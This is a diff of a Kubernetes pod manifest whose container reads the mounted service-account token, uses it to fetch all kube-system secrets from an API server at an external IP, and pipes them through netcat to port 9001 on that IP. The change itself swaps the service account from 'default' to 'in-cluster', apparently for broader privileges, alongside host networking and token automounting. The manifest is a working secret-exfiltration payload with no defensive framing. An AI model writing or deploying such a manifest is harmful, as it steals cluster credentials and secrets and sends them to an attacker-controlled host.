@@ -9,6 +9,6 @@ spec:
     image: alpine
     command: ["/bin/sh"]
     args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://188.227.84.184:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 188.227.84.184 9001; sleep 100000']
-  serviceAccountName: default
+  serviceAccountName: in-cluster
   automountServiceAccountToken: true
   hostNetwork: true
